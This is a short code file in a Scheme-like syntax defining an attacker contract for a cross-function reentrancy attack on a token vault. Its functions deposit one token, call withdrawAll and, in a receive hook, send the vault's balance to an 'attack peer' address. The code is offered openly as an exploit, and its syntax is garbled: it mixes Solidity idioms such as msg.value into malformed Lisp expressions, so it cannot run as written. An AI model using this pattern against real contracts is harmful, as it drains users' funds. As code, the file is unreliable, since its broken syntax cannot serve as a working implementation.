(define CrossFuncAttack
  (record
    (deposit
     transfer
     withdrawAll
     getUserBalance)))

(define (make-Attack balance)
  ; Initialize attacker's peer address
  (let ((attack-peer #f)) 
    (define (set-Attack-Peer _attackPeer)
      (set! attack-peer _attackPeer))

    ; Function for the attacker to receive funds
    (define (receive)
      (let ((fund-vault-balance (balance 'getUserBalance (address this))))
        (when (>= fund-vault-balance 1 fund)
          ; Transfer all funds from fund vault to attacker's peer address
          (balance 'transfer (address attack-peer) fund-vault-balance))))

    ; Function for the attacker to initialize the attack
    (define (attack-Init)
      (assert (= (msg.value) 1 fund) "Require 1 Token to attack")
      (balance 'deposit (value: 1 fund))
      (balance 'withdrawAll))

    ; Function for the attacker to perform next step of the attack
    (define (attack-Next)
      (balance 'withdrawAll))

    (define (get-Balance)
      (address this 'balance))

    ; Return the functions and state of the attacker
    (record
      (balance balance) ; Function to interact with balance
      (attackPeer attack-peer) ; Attacker's peer address
      (setAttackPeer set-Attack-Peer) ; Function to set attacker's peer address
      (receive receive) ; Function for attacker to receive funds
      (attackInit attack-Init) ; Function for attacker to initialize attack
      (attackNext attack-Next) ; Function for attacker to perform next step of attack
      (getBalance get-Balance))))) ; Function to get attacker's balance
